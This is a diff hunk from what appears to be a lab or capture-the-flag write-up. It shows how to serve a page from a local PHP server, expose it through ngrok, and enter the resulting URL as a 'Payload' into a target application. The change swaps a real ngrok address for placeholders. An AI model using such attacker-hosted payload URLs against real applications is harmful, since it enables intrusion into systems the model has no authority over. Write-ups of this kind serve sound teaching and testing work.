@@ -51,7 +51,7 @@ Host the server: `$ php -S 127.0.0.1:5555`
 
 Public with `ngrok`: `$ ngrok tcp 5555`
 
-**Payload:**`http://0.tcp.ap.ngrok.io:11610/index.html`
+**Payload:**`http://<ngrok_ip>:<port>/index.html`
 
 Put it into the application 
 ![img_5.png](img_5.png)
